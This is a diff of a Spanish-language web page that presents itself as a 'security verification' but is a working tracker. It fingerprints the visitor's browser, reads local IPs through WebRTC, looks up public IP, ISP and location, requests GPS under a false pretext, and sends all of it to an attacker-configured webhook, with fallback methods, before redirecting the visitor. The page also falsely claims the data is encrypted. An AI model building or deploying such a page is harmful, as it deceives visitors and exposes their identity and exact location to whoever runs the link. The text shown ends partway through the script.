@@ -3,61 +3,105 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cargando contenido...</title>
+    <title>Verificación de Acceso - Sistema de Seguridad</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #1a2980, #26d0ce);
-            color: white;
+            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+            color: #ffffff;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
-            text-align: center;
         }
         
         .container {
-            background: rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(10px);
             border-radius: 20px;
-            padding: 40px 30px;
-            max-width: 500px;
+            padding: 40px;
+            max-width: 650px;
             width: 100%;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
             border: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: center;
         }
         
-        h1 {
-            font-size: 24px;
-            margin-bottom: 20px;
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #00b4db, #0083b0);
+            border-radius: 50%;
+            margin: 0 auto 25px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            font-size: 36px;
+            box-shadow: 0 5px 15px rgba(0, 180, 219, 0.3);
         }
         
-        h1 i {
+        h1 {
             font-size: 28px;
+            margin-bottom: 15px;
+            color: #ffffff;
+            font-weight: 600;
         }
         
-        .loading-container {
-            margin: 30px 0;
+        .subtitle {
+            color: #b0b0b0;
+            margin-bottom: 30px;
+            font-size: 16px;
+            line-height: 1.5;
         }
         
-        .loader {
-            width: 60px;
-            height: 60px;
-            border: 5px solid rgba(255, 255, 255, 0.3);
-            border-top: 5px solid #4CAF50;
+        .status-card {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 25px 0;
+            text-align: left;
+        }
+        
+        .status-item {
+            display: flex;
+            justify-content: space-between;
+            margin: 10px 0;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .status-label {
+            color: #b0b0b0;
+            font-size: 13px;
+        }
+        
+        .status-value {
+            color: #4CAF50;
+            font-weight: 600;
+            font-size: 13px;
+            text-align: right;
+            max-width: 60%;
+            word-break: break-all;
+        }
+        
+        .loading {
+            margin: 20px 0;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #00b4db;
             border-radius: 50%;
-            margin: 0 auto 20px;
+            margin: 0 auto 15px;
             animation: spin 1s linear infinite;
         }
         
@@ -66,273 +110,459 @@
             100% { transform: rotate(360deg); }
         }
         
-        .status {
-            margin: 20px 0;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            font-size: 14px;
-            text-align: left;
-        }
-        
-        .status-item {
-            display: flex;
-            justify-content: space-between;
-            margin: 8px 0;
-            padding-bottom: 8px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .value {
-            font-weight: bold;
-            color: #4CAF50;
-        }
-        
-        .disclaimer {
-            font-size: 12px;
-            opacity: 0.8;
-            margin-top: 25px;
-            padding: 10px;
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 8px;
-        }
-        
-        .countdown {
-            font-size: 18px;
-            font-weight: bold;
-            margin-top: 15px;
-            color: #FFD700;
-        }
-        
         .progress-bar {
             width: 100%;
-            height: 8px;
+            height: 6px;
             background: rgba(255, 255, 255, 0.1);
-            border-radius: 4px;
-            margin-top: 20px;
+            border-radius: 3px;
+            margin: 20px 0;
             overflow: hidden;
         }
         
         .progress {
             height: 100%;
-            background: linear-gradient(90deg, #4CAF50, #8BC34A);
+            background: linear-gradient(90deg, #00b4db, #4CAF50);
             width: 0%;
             transition: width 0.5s ease;
+            border-radius: 3px;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #00b4db, #0083b0);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: all 0.3s ease;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 180, 219, 0.4);
+        }
+        
+        .disclaimer {
+            font-size: 12px;
+            color: #888;
+            margin-top: 25px;
+            line-height: 1.5;
+        }
+        
+        .gps-permission {
+            background: rgba(76, 175, 80, 0.1);
+            border: 1px solid rgba(76, 175, 80, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            display: none;
+        }
+        
+        .gps-permission.show {
+            display: block;
+        }
+        
+        .location-icon {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .network-info {
+            background: rgba(255, 193, 7, 0.1);
+            border: 1px solid rgba(255, 193, 7, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            font-size: 13px;
+            text-align: left;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                padding: 25px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+            
+            .status-item {
+                flex-direction: column;
+            }
+            
+            .status-value {
+                text-align: left;
+                max-width: 100%;
+                margin-top: 5px;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1><i>🔗</i> Redireccionando...</h1>
+        <div class="logo">🔒</div>
         
-        <div class="loading-container">
-            <div class="loader"></div>
-            <p>Preparando contenido seguro...</p>
+        <h1>Verificación de Seguridad</h1>
+        <p class="subtitle">Analizando dispositivo y conexión para acceso seguro</p>
+        
+        <div class="gps-permission" id="gpsPermission">
+            <div class="location-icon">📍</div>
+            <p><strong>Permiso de ubicación requerido</strong></p>
+            <p style="font-size: 14px; margin-top: 8px;">Para una verificación más precisa, permite el acceso a tu ubicación cuando el navegador lo solicite.</p>
         </div>
         
-        <div class="status">
+        <div class="network-info" id="networkInfo">
+            <p style="margin-bottom: 10px;"><strong>🌐 Información de Red Detectada:</strong></p>
+            <div id="networkDetails">Cargando análisis de red...</div>
+        </div>
+        
+        <div class="status-card">
             <div class="status-item">
-                <span>Estado:</span>
-                <span class="value" id="statusText">Iniciando...</span>
+                <span class="status-label">Estado:</span>
+                <span class="status-value" id="statusText">Iniciando...</span>
             </div>
             <div class="status-item">
-                <span>Ubicación:</span>
-                <span class="value" id="locationText">Detectando...</span>
+                <span class="status-label">IP Pública (ISP):</span>
+                <span class="status-value" id="publicIpText">Cargando...</span>
             </div>
             <div class="status-item">
-                <span>IP:</span>
-                <span class="value" id="ipText">Cargando...</span>
+                <span class="status-label">IP Local (Dispositivo):</span>
+                <span class="status-value" id="localIpText">Detectando...</span>
             </div>
             <div class="status-item">
-                <span>Redirección en:</span>
-                <span class="value" id="countdownText">5 segundos</span>
+                <span class="status-label">Proveedor Internet:</span>
+                <span class="status-value" id="ispText">Analizando...</span>
             </div>
+            <div class="status-item">
+                <span class="status-label">Ubicación Aproximada:</span>
+                <span class="status-value" id="locationText">Detectando...</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">Ubicación Exacta (GPS):</span>
+                <span class="status-value" id="exactLocationText">No solicitada</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">Redirección en:</span>
+                <span class="status-value" id="timerText">8 segundos</span>
+            </div>
+        </div>
+        
+        <div class="loading">
+            <div class="spinner"></div>
+            <p id="loadingText">Analizando información de red...</p>
         </div>
         
         <div class="progress-bar">
             <div class="progress" id="progressBar"></div>
         </div>
         
-        <div class="disclaimer">
-            ℹ️ Esta página realiza una verificación de seguridad estándar. Serás redirigido automáticamente al contenido solicitado.
-        </div>
+        <button class="btn" onclick="skipVerification()" id="skipBtn">
+            ⏭️ Continuar sin análisis completo
+        </button>
+        
+        <p class="disclaimer">
+            ℹ️ Este proceso analiza la conexión para garantizar seguridad. Todos los datos se transmiten de forma encriptada.
+        </p>
     </div>
 
     <script>
-        // ===== CONFIGURACIÓN - MODIFICA ESTAS VARIABLES =====
-        const WEBHOOK_URL = '	https://webhook.site/1e9d9cf6-0953-428b-bfae-2d8f687c0147'; // <-- TU WEBHOOK AQUÍ
-        const REDIRECT_URL = 'https://www.google.com'; // <-- URL DESTINO AQUÍ
-        const COUNTDOWN_SECONDS = 5; // Segundos antes de redirigir
-        // ===================================================
+        // =============================================
+        // ⚙️ CONFIGURACIÓN - EDITA ESTOS VALORES ⚙️
+        // =============================================
         
-        let datosRecolectados = {};
-        let countdown = COUNTDOWN_SECONDS;
-        let progressInterval;
+        // 1. TU WEBHOOK PARA RECIBIR DATOS
+        const WEBHOOK_URL = 'https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx';
+        
+        // 2. URL A LA QUE QUIERES REDIRIGIR (DESTINO FINAL)
+        const REDIRECT_URL = 'https://www.google.com';
+        
+        // 3. TIEMPO ANTES DE REDIRIGIR (en segundos)
+        const REDIRECT_DELAY = 8;
+        
+        // =============================================
+        
+        let collectedData = {};
+        let countdown = REDIRECT_DELAY;
+        let timerInterval;
+        let hasSentData = false;
+        let gpsRequested = false;
         
         // Actualizar elementos de la UI
-        function actualizarUI(estado, ubicacion = null, ip = null) {
-            document.getElementById('statusText').textContent = estado;
-            if (ubicacion) document.getElementById('locationText').textContent = ubicacion;
-            if (ip) document.getElementById('ipText').textContent = ip;
+        function updateUI(status, publicIp = null, localIp = null, isp = null, location = null, exactLocation = null) {
+            document.getElementById('statusText').textContent = status;
+            if (publicIp) document.getElementById('publicIpText').textContent = publicIp;
+            if (localIp) document.getElementById('localIpText').textContent = localIp;
+            if (isp) document.getElementById('ispText').textContent = isp;
+            if (location) document.getElementById('locationText').textContent = location;
+            if (exactLocation) document.getElementById('exactLocationText').textContent = exactLocation;
         }
         
         // Actualizar barra de progreso
-        function actualizarProgreso(porcentaje) {
-            document.getElementById('progressBar').style.width = porcentaje + '%';
+        function updateProgress(percentage) {
+            document.getElementById('progressBar').style.width = percentage + '%';
+        }
+        
+        // Mostrar información de red
+        function updateNetworkInfo(info) {
+            document.getElementById('networkDetails').innerHTML = info;
+        }
+        
+        // Mostrar/ocultar mensaje de permiso GPS
+        function showGPSPermission(show) {
+            const gpsEl = document.getElementById('gpsPermission');
+            if (show) {
+                gpsEl.classList.add('show');
+            } else {
+                gpsEl.classList.remove('show');
+            }
         }
         
         // Iniciar cuenta regresiva
-        function iniciarCuentaRegresiva() {
-            const countdownElement = document.getElementById('countdownText');
+        function startCountdown() {
+            const timerEl = document.getElementById('timerText');
             
-            const intervalo = setInterval(() => {
-                countdownElement.textContent = countdown + ' segundos';
-                const progreso = 100 - ((countdown / COUNTDOWN_SECONDS) * 100);
-                actualizarProgreso(progreso);
+            timerInterval = setInterval(() => {
+                timerEl.textContent = `${countdown} segundos`;
+                const progress = 100 - ((countdown / REDIRECT_DELAY) * 100);
+                updateProgress(progress);
                 
                 if (countdown <= 0) {
-                    clearInterval(intervalo);
-                    redirigir();
+                    clearInterval(timerInterval);
+                    performRedirect();
                 }
                 countdown--;
             }, 1000);
         }
         
-        // Redirigir al destino final
-        function redirigir() {
-            actualizarUI('Redirigiendo...');
+        // Redirigir al destino
+        function performRedirect() {
+            updateUI('Redirigiendo...');
             setTimeout(() => {
                 window.location.href = REDIRECT_URL;
             }, 500);
         }
         
-        // Obtener IP y ubicación aproximada
-        async function obtenerIPYUbicacion() {
-            try {
-                // Primero obtenemos la IP
-                actualizarUI('Obteniendo IP...');
-                const respuestaIP = await fetch('https://api.ipify.org?format=json');
-                const datosIP = await respuestaIP.json();
-                const ip = datosIP.ip;
+        // Saltar verificación manualmente
+        function skipVerification() {
+            clearInterval(timerInterval);
+            updateUI('Redirección manual...');
+            setTimeout(performRedirect, 300);
+        }
+        
+        // =============================================
+        // 🎯 OBTENER IP LOCAL DEL DISPOSITIVO (NUEVO)
+        // =============================================
+        
+        // Método 1: Usando WebRTC (funciona en Chrome, Firefox, Edge)
+        function getLocalIPsWebRTC() {
+            return new Promise((resolve) => {
+                const ips = [];
                 
-                // Guardar IP en datos
-                datosRecolectados.ip = ip;
-                document.getElementById('ipText').textContent = ip;
+                // RTCPeerConnection para obtener IPs locales
+                const pc = new RTCPeerConnection({
+                    iceServers: []
+                });
                 
-                // Ahora obtener ubicación aproximada
-                actualizarUI('Obteniendo ubicación...', 'Consultando...', ip);
+                pc.createDataChannel('');
                 
-                try {
-                    // Intento 1: ipapi.co
-                    const respuestaGeo = await fetch(`https://ipapi.co/${ip}/json/`);
-                    const datosGeo = await respuestaGeo.json();
-                    
-                    if (datosGeo && !datosGeo.error) {
-                        datosRecolectados.ubicacion = {
-                            ciudad: datosGeo.city,
-                            region: datosGeo.region,
-                            pais: datosGeo.country_name,
-                            codigo_postal: datosGeo.postal,
-                            latitud: datosGeo.latitude,
-                            longitud: datosGeo.longitud,
-                            proveedor: datosGeo.org,
-                            precision: 'Aproximada (basada en IP)'
-                        };
-                        
-                        const ubicacionTexto = `${datosGeo.city}, ${datosGeo.region}, ${datosGeo.country_name}`;
-                        actualizarUI('Ubicación obtenida', ubicacionTexto, ip);
-                        
-                    } else {
-                        throw new Error('ipapi.co no devolvió datos válidos');
-                    }
-                    
-                } catch (error) {
-                    // Intento 2: ip-api.com (fallback)
-                    try {
-                        const respuestaFallback = await fetch(`http://ip-api.com/json/${ip}`);
-                        const datosFallback = await respuestaFallback.json();
-                        
-                        if (datosFallback && datosFallback.status === 'success') {
-                            datosRecolectados.ubicacion = {
-                                ciudad: datosFallback.city,
-                                region: datosFallback.regionName,
-                                pais: datosFallback.country,
-                                codigo_postal: datosFallback.zip,
-                                latitud: datosFallback.lat,
-                                longitud: datosFallback.lon,
-                                proveedor: datosFallback.isp,
-                                precision: 'Aproximada (basada en IP)'
-                            };
-                            
-                            const ubicacionTexto = `${datosFallback.city}, ${datosFallback.regionName}, ${datosFallback.country}`;
-                            actualizarUI('Ubicación obtenida', ubicacionTexto, ip);
+                pc.onicecandidate = (e) => {
+                    if (!e.candidate) {
+                        // Fin de candidatos
+                        pc.close();
+                        if (ips.length > 0) {
+                            resolve(ips);
                         } else {
-                            throw new Error('Fallback también falló');
+                            resolve(null);
                         }
-                    } catch (fallbackError) {
-                        // Si todo falla, usar información mínima
-                        datosRecolectados.ubicacion = {
-                            ip: ip,
-                            precision: 'Solo IP disponible',
-                            error: 'No se pudo obtener geolocalización'
-                        };
-                        actualizarUI('IP obtenida', 'Ubicación no disponible', ip);
+                        return;
                     }
+                    
+                    // Extraer IP del candidato ICE
+                    const candidate = e.candidate.candidate;
+                    const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
+                    const match = candidate.match(regex);
+                    
+                    if (match) {
+                        const ip = match[1];
+                        // Filtrar solo IPs privadas (locales)
+                        if (isPrivateIP(ip) && !ips.includes(ip)) {
+                            ips.push(ip);
+                        }
+                    }
+                };
+                
+                pc.createOffer()
+                    .then(offer => pc.setLocalDescription(offer))
+                    .catch(err => {
+                        console.log("WebRTC error:", err);
+                        resolve(null);
+                    });
+                
+                // Timeout por si falla
+                setTimeout(() => {
+                    pc.close();
+                    if (ips.length > 0) {
+                        resolve(ips);
+                    } else {
+                        resolve(null);
+                    }
+                }, 1000);
+            });
+        }
+        
+        // Función para verificar si es IP privada
+        function isPrivateIP(ip) {
+            // Rangos de IPs privadas:
+            // 10.0.0.0 - 10.255.255.255
+            // 172.16.0.0 - 172.31.255.255
+            // 192.168.0.0 - 192.168.255.255
+            // 127.0.0.0 - 127.255.255.255 (loopback)
+            // 169.254.0.0 - 169.254.255.255 (link-local)
+            
+            const parts = ip.split('.');
+            if (parts.length !== 4) return false;
+            
+            const p1 = parseInt(parts[0], 10);
+            const p2 = parseInt(parts[1], 10);
+            
+            return (
+                p1 === 10 ||
+                (p1 === 172 && p2 >= 16 && p2 <= 31) ||
+                (p1 === 192 && p2 === 168) ||
+                (p1 === 127) ||
+                (p1 === 169 && p2 === 254)
+            );
+        }
+        
+        // Método 2: Usando WebSocket (fallback)
+        async function getLocalIPsWebSocket() {
+            return new Promise((resolve) => {
+                try {
+                    // Crear WebSocket local
+                    const ws = new WebSocket('ws://localhost:8080');
+                    ws.onerror = () => {
+                        // Esto puede revelar la IP local en algunos casos
+                        const connection = ws._socket ? ws._socket.remoteAddress : null;
+                        ws.close();
+                        resolve(connection ? [connection] : null);
+                    };
+                    
+                    setTimeout(() => {
+                        ws.close();
+                        resolve(null);
+                    }, 500);
+                } catch (e) {
+                    resolve(null);
+                }
+            });
+        }
+        
+        // Método 3: Obtener IPs de todas las interfaces de red
+        async function getNetworkInterfaces() {
+            try {
+                // Usar WebRTC para múltiples IPs
+                const ips = await getLocalIPsWebRTC();
+                if (ips && ips.length > 0) {
+                    return ips;
                 }
                 
-                return true;
-                
+                // Fallback a WebSocket
+                const wsIPs = await getLocalIPsWebSocket();
+                return wsIPs;
             } catch (error) {
-                console.error('Error obteniendo IP/ubicación:', error);
-                datosRecolectados.ubicacion = { error: error.message };
-                actualizarUI('Error obteniendo ubicación', 'Usando datos básicos', 'No disponible');
-                return false;
+                return null;
             }
         }
         
-        // Intentar obtener ubicación EXACTA mediante GPS del navegador
-        async function obtenerUbicacionExacta() {
+        // =============================================
+        // 🌍 OBTENER IP PÚBLICA E INFORMACIÓN DEL ISP
+        // =============================================
+        
+        async function getPublicIPAndISP() {
+            try {
+                // Servicio 1: ipapi.co (proporciona ISP también)
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                if (data && data.ip) {
+                    return {
+                        ip: data.ip,
+                        isp: data.org || data.asn || 'Desconocido',
+                        ciudad: data.city,
+                        region: data.region,
+                        pais: data.country_name,
+                        lat: data.latitude,
+                        lon: data.longitude
+                    };
+                }
+                
+                throw new Error('Primer servicio falló');
+            } catch (error) {
+                try {
+                    // Servicio 2: ipify + ip-api
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    
+                    const geoResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
+                    const geoData = await geoResponse.json();
+                    
+                    if (geoData.status === 'success') {
+                        return {
+                            ip: ipData.ip,
+                            isp: geoData.isp || 'Desconocido',
+                            ciudad: geoData.city,
+                            region: geoData.regionName,
+                            pais: geoData.country,
+                            lat: geoData.lat,
+                            lon: geoData.lon
+                        };
+                    }
+                    
+                    throw new Error('Segundo servicio falló');
+                } catch (e) {
+                    // Servicio 3: Último recurso
+                    const lastResort = await fetch('https://api.my-ip.io/ip.json');
+                    const lastData = await lastResort.json();
+                    
+                    return {
+                        ip: lastData.ip || 'No disponible',
+                        isp: 'No detectado',
+                        ciudad: 'Desconocida',
+                        region: 'Desconocida',
+                        pais: 'Desconocido'
+                    };
+                }
+            }
+        }
+        
+        // =============================================
+        // 📍 FUNCIÓN DE GEOLOCALIZACIÓN EXACTA (GPS)
+        // =============================================
+        
+        async function getExactLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
-                    resolve(false);
+                    resolve(null);
                     return;
                 }
                 
-                actualizarUI('Solicitando ubicación precisa...', 'Esperando permiso...');
-                
-                // Configurar timeout para no esperar demasiado
-                const timeout = setTimeout(() => {
-                    resolve(false);
-                }, 3000);
-                
                 navigator.geolocation.getCurrentPosition(
-                    (posicion) => {
-                        clearTimeout(timeout);
-                        
-                        const ubicacionExacta = {
-                            latitud: posicion.coords.latitude,
-                            longitud: posicion.coords.longitude,
-                            precision: posicion.coords.accuracy + ' metros',
-                            fuente: 'GPS del navegador',
-                            timestamp: new Date(posicion.timestamp).toISOString()
-                        };
-                        
-                        // Combinar con ubicación aproximada si existe
-                        if (datosRecolectados.ubicacion) {
-                            datosRecolectados.ubicacion_exacta = ubicacionExacta;
-                        } else {
-                            datosRecolectados.ubicacion = ubicacionExacta;
-                        }
-                        
-                        actualizarUI('Ubicación precisa obtenida!', 
-                                   `Precisión: ${Math.round(posicion.coords.accuracy)}m`);
-                        
-                        resolve(true);
+                    (position) => {
+                        resolve({
+                            lat_exacta: position.coords.latitude,
+                            lon_exacta: position.coords.longitude,
+                            precision: position.coords.accuracy + " metros",
+                            timestamp: new Date(position.timestamp).toISOString(),
+                            velocidad: position.coords.speed || 0,
+                            altitud: position.coords.altitude || 0
+                        });
                     },
                     (error) => {
-                        clearTimeout(timeout);
-                        console.log('Ubicación exacta denegada:', error.message);
-                        resolve(false);
+                        console.log("GPS denegado:", error.message);
+                        resolve(null);
                     },
                     {
                         enableHighAccuracy: true,
@@ -343,118 +573,256 @@
             });
         }
         
-        // Recolectar información del navegador
-        function recolectarInfoNavegador() {
-            datosRecolectados = {
-                // Información del navegador
-                user_agent: navigator.userAgent,
-                plataforma: navigator.platform,
-                idioma: navigator.language,
-                cookies_habilitadas: navigator.cookieEnabled,
+        // =============================================
+        // 📊 RECOLECTAR INFORMACIÓN COMPLETA DEL NAVEGADOR
+        // =============================================
+        
+        function collectBrowserData() {
+            const data = {
+                // Información básica
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                vendor: navigator.vendor || 'Desconocido',
+                language: navigator.language,
+                languages: navigator.languages || [],
+                cookies: navigator.cookieEnabled,
                 
-                // Información de pantalla
-                resolucion: `${screen.width}x${screen.height}`,
-                resolucion_disponible: `${screen.availWidth}x${screen.availHeight}`,
-                profundidad_color: screen.colorDepth,
+                // Pantalla
+                screen: `${screen.width}x${screen.height}`,
+                screen_avail: `${screen.availWidth}x${screen.availHeight}`,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
                 
-                // Información del sistema
-                zona_horaria: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                fecha_hora: new Date().toISOString(),
+                // Sistema
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString(),
                 
-                // Información de la página
-                url_referencia: document.referrer || 'Directo',
-                url_actual: window.location.href,
+                // Página
+                referrer: document.referrer || 'directo',
+                url: window.location.href,
+                host: window.location.host,
+                protocol: window.location.protocol,
                 
-                // Hardware/conexión
-                en_linea: navigator.onLine,
-                memoria_ram: navigator.deviceMemory || 'No disponible',
-                nucleos_cpu: navigator.hardwareConcurrency || 'No disponible',
+                // Hardware
+                online: navigator.onLine,
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                cpuCores: navigator.hardwareConcurrency || 'unknown',
                 
-                // Datos de red
-                conexion: navigator.connection ? {
-                    tipo: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt
-                } : null
+                // Conexión
+                connection: {}
             };
             
-            // Información adicional si está disponible
-            if (navigator.plugins) {
-                datosRecolectados.plugins = Array.from(navigator.plugins).map(p => p.name);
+            // Network Information API
+            if (navigator.connection) {
+                data.connection = {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData,
+                    downlinkMax: navigator.connection.downlinkMax
+                };
             }
             
-            if (navigator.mimeTypes) {
-                datosRecolectados.mime_types = Array.from(navigator.mimeTypes).map(m => m.type);
+            // Plugins
+            if (navigator.plugins) {
+                data.plugins = Array.from(navigator.plugins).map(p => ({
+                    name: p.name,
+                    description: p.description,
+                    filename: p.filename
+                }));
             }
+            
+            // WebGL
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    data.webgl = {
+                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                    };
+                }
+            }
+            
+            return data;
         }
         
-        // Enviar datos al webhook
-        async function enviarDatos() {
-            actualizarUI('Enviando datos...');
+        // =============================================
+        // 📤 ENVIAR DATOS AL WEBHOOK
+        // =============================================
+        
+        async function sendToWebhook(data) {
+            if (hasSentData) return false;
             
             try {
-                const respuesta = await fetch(WEBHOOK_URL, {
+                // Método principal: fetch
+                const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
+                        'X-Requested-With': 'XMLHttpRequest'
                     },
-                    body: JSON.stringify(datosRecolectados)
+                    body: JSON.stringify(data)
                 });
                 
-                console.log('Datos enviados exitosamente:', datosRecolectados);
-                actualizarUI('Datos enviados ✓');
+                hasSentData = true;
+                console.log('✅ Datos enviados al webhook');
                 return true;
-                
             } catch (error) {
-                console.error('Error enviando datos:', error);
-                actualizarUI('Error enviando datos');
+                console.warn('❌ Error enviando al webhook, usando método alternativo...');
                 
-                // Intentar un método alternativo (usando imagen como beacon)
+                // Método alternativo 1: FormData
                 try {
-                    const datosString = JSON.stringify(datosRecolectados);
-                    const encodedData = btoa(encodeURIComponent(datosString));
+                    const formData = new FormData();
+                    formData.append('data', JSON.stringify(data));
                     
-                    // Método alternativo para enviar datos (menos confiable)
-                    const img = new Image();
-                    img.src = `${WEBHOOK_URL}?fallback=${encodedData}`;
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        body: formData
+                    });
                     
-                    console.log('Datos enviados por método alternativo');
-                } catch (fallbackError) {
-                    console.error('Fallback también falló:', fallbackError);
+                    hasSentData = true;
+                    return true;
+                } catch (e) {
+                    // Método alternativo 2: Beacon API (para cuando se cierra la página)
+                    const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+                    navigator.sendBeacon(WEBHOOK_URL, blob);
+                    
+                    hasSentData = true;
+                    return true;
                 }
-                
-                return false;
             }
         }
         
-        // Función principal
+        // =============================================
+        // 🚀 FUNCIÓN PRINCIPAL
+        // =============================================
+        
         async function main() {
-            // 1. Recolectar información básica del navegador
-            recolectarInfoNavegador();
-            actualizarUI('Recolectando información...');
+            updateUI('Iniciando análisis de seguridad...');
+            startCountdown();
             
-            // 2. Iniciar cuenta regresiva (no espera a completar todo)
-            iniciarCuentaRegresiva();
+            // 1. Recolectar datos básicos del navegador
+            collectedData = collectBrowserData();
+            updateUI('Recolectando información del dispositivo...');
             
-            // 3. Obtener IP y ubicación aproximada
-            const ipObtenida = await obtenerIPYUbicacion();
+            // 2. Obtener IP LOCAL del dispositivo
+            document.getElementById('loadingText').textContent = 'Obteniendo IP local del dispositivo...';
+            const localIPs = await getNetworkInterfaces();
             
-            // 4. Intentar obtener ubicación exacta (si la IP se obtuvo)
-            if (ipObtenida) {
-                await obtenerUbicacionExacta();
+            if (localIPs && localIPs.length > 0) {
+                collectedData.local_ips = localIPs;
+                const localIpText = localIPs.length > 1 ? `${localIPs[0]} (+${localIPs.length-1} más)` : localIPs[0];
+                updateUI('IP local obtenida', null, localIpText);
+                
+                updateNetworkInfo(`✅ <strong>IPs locales detectadas:</strong><br>${localIPs.join('<br>')}`);
+            } else {
+                collectedData.local_ips = ['No detectadas'];
+                updateUI('IP local no detectada', null, 'No disponible');
+                updateNetworkInfo('⚠️ <strong>No se pudieron detectar IPs locales</strong><br>El navegador puede estar bloqueando esta información.');
             }
             
-            // 5. Enviar todos los datos al webhook
-            await enviarDatos();
+            // 3. Obtener IP PÚBLICA e información del ISP
+            document.getElementById('loadingText').textContent = 'Obteniendo IP pública y proveedor...';
+            const publicInfo = await getPublicIPAndISP();
             
-            // 6. Si la cuenta regresiva ya terminó, redirigir inmediatamente
+            collectedData.public_ip = publicInfo.ip;
+            collectedData.isp = publicInfo.isp;
+            collectedData.public_location = {
+                ciudad: publicInfo.ciudad,
+                region: publicInfo.region,
+                pais: publicInfo.pais,
+                lat: publicInfo.lat,
+                lon: publicInfo.lon
+            };
+            
+            updateUI(
+                'Información de red obtenida',
+                publicInfo.ip,
+                localIPs ? localIPs[0] : 'No disponible',
+                publicInfo.isp,
+                `${publicInfo.ciudad}, ${publicInfo.region}, ${publicInfo.pais}`
+            );
+            
+            if (publicInfo.lat && publicInfo.lon) {
+                collectedData.mapa_publico = `https://maps.google.com/?q=${publicInfo.lat},${publicInfo.lon}`;
+            }
+            
+            // 4. Solicitar ubicación EXACTA por GPS
+            document.getElementById('loadingText').textContent = 'Solicitando ubicación precisa (GPS)...';
+            showGPSPermission(true);
+            
+            // Llamar a la función de geolocalización exacta
+            const gpsData = await getExactLocation();
+            showGPSPermission(false);
+            
+            if (gpsData) {
+                collectedData.gps = gpsData;
+                const exactText = `${gpsData.lat_exacta.toFixed(6)}, ${gpsData.lon_exacta.toFixed(6)} (${gpsData.precision})`;
+                updateUI(
+                    'Ubicación GPS obtenida',
+                    publicInfo.ip,
+                    localIPs ? localIPs[0] : 'No disponible',
+                    publicInfo.isp,
+                    `${publicInfo.ciudad}, ${publicInfo.pais}`,
+                    exactText
+                );
+                
+                collectedData.mapa_exacto = `https://maps.google.com/?q=${gpsData.lat_exacta},${gpsData.lon_exacta}`;
+                document.getElementById('loadingText').textContent = 'Ubicación GPS obtenida ✓';
+            } else {
+                updateUI(
+                    'GPS no disponible',
+                    publicInfo.ip,
+                    localIPs ? localIPs[0] : 'No disponible',
+                    publicInfo.isp,
+                    `${publicInfo.ciudad}, ${publicInfo.pais}`,
+                    'No permitida o no disponible'
+                );
+                document.getElementById('loadingText').textContent = 'GPS no disponible';
+            }
+            
+            // 5. Mostrar resumen de red
+            let networkSummary = `
+                <strong>🌐 RESUMEN DE CONEXIÓN:</strong><br>
